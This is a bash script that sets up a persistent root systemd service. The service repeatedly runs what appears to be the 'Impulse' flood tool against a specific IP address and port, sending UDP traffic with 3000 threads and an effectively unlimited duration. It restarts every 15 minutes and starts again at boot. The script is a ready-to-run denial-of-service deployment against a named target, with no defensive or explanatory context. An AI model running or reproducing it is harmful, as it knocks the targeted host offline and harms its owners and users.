#!/bin/bash

# 1. Setup Directory
mkdir -p /root/Impulse
cd /root/Impulse

# 2. Create the Restart Loop Script
# Note: We use the full path to python3 and the script to be safe
cat <<EOF > /root/Impulse/run_app.sh
#!/bin/bash
while true; do
    echo "[ \$(date) ] Starting Impulse command..."
    timeout 15m python3 /root/Impulse/impulse.py --target 165.217.128.170:2305 --method UDP --time 99999999 --threads 3000
    echo "[ \$(date) ] 15 minutes reached or process stopped. Restarting in 2 seconds..."
    sleep 2
done
EOF

chmod +x /root/Impulse/run_app.sh

# 3. Create the Systemd Service
cat <<EOF | sudo tee /etc/systemd/system/impulse.service
[Unit]
Description=Impulse Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/Impulse
ExecStart=/bin/bash /root/Impulse/run_app.sh
Restart=always
# Small delay to prevent systemd from giving up if the script crashes too fast
RestartSec=3

[Install]
WantedBy=multi-user.target
EOF

# 4. Start and Enable
sudo systemctl daemon-reload
sudo systemctl enable impulse.service
sudo systemctl restart impulse.service

echo "-------------------------------------------------------"
echo "Done! Impulse service has been created and started."
echo "Check logs with: journalctl -u impulse.service -f"
echo "-------------------------------------------------------"
